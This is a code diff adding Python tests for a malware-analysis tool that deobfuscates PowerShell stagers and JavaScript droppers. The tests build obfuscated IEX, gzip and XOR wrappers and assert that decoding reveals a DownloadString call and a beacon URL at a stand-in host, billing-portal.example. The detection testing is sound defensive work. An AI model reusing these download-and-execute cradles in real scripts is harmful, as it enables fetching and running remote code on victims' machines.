@@ -74,3 +74,59 @@ def test_sample_end_to_end(tmp_path: Path) -> None:
     assert "billing-portal.example" in next(t for t in sc["techniques"] if t["id"] == "dropped_payload")["payload"]
     rules = {x["rule"] for x in res["findings"]}
     assert {"js_dropped_payload", "js_antisandbox_timing", "js_payload_key_decryptor"} <= rules
+
+
+def _ms():
+    spec = importlib.util.spec_from_file_location(
+        "ms2", Path(__file__).parents[1] / "scripts" / "make_samples.py")
+    ms = importlib.util.module_from_spec(spec)
+    spec.loader.exec_module(ms)
+    return ms
+
+
+def test_ps_xor_deflate_stager_resolves_to_final_stage() -> None:
+    from docutracex.parsers import ps_deobf
+    r = ps_deobf.deobfuscate(_ms().xor_stager_ps1().decode())
+    assert {"xor-base64", "xor-char-array", "decompress"} <= set(r["methods"])
+    assert "DownloadString('http://billing-portal.example/inv/stage4.ps1')" in r["code"]
+    assert "'http://billing-portal.example/inv/beacon'" in r["code"]
+
+
+def test_ps_gzip_inline_and_numeric_key() -> None:
+    import base64
+    import zlib
+    from docutracex.parsers import ps_deobf
+    final = "Start-Process calc.exe"
+    c = zlib.compressobj(9, zlib.DEFLATED, 31)
+    b = base64.b64encode(c.compress(final.encode()) + c.flush()).decode()
+    cmd = ("IEX (New-Object IO.StreamReader((New-Object IO.Compression.GZipStream([IO.MemoryStream]"
+           f"[Convert]::FromBase64String('{b}'),[IO.Compression.CompressionMode]::Decompress)),"
+           "[Text.Encoding]::ASCII)).ReadToEnd()")
+    assert ps_deobf.deobfuscate(cmd)["code"].strip() == final
+    x = base64.b64encode(bytes(ch ^ 0x41 for ch in final.encode())).decode()
+    loop = f"$d = [Convert]::FromBase64String('{x}'); foreach ($i in 0..($d.Length-1)) {{ $d[$i] = $d[$i] -bxor 0x41 }}"
+    assert final in ps_deobf.deobfuscate(loop)["code"]
+
+
+def test_binary_base64_is_not_turned_into_garbage() -> None:
+    import base64
+    import random
+    from docutracex.parsers import ps_deobf
+    rnd = random.Random(1234)
+    for _ in range(50):
+        b = base64.b64encode(bytes(rnd.randrange(256) for _ in range(64))).decode()
+        cmd = f"$x = [Convert]::FromBase64String('{b}')"
+        assert ps_deobf.deobfuscate(cmd)["code"] == cmd
+
+
+@pytest.mark.skipif(not _have_v8(), reason="STPyV8 not installed")
+def test_js_to_powershell_full_chain(tmp_path: Path) -> None:
+    from docutracex.parsers import powershell
+    f = tmp_path / "c.js"
+    f.write_bytes(_ms().chain_dropper_js())
+    js = J.analyze(f, tmp_path / "none", {})
+    ps = powershell.analyze(tmp_path / "x.bin", tmp_path / "none", {"javascript": js})
+    assert len(ps["scripts"]) == 1                          # XOR result and Run() deduplicated
+    sc = ps["scripts"][0]
+    assert "stage4.ps1" in sc["code"] and "inv_viewer.exe" in sc["code"]
+    assert {"ps_download", "ps_encoded"} <= {x["rule"] for x in ps["findings"]}
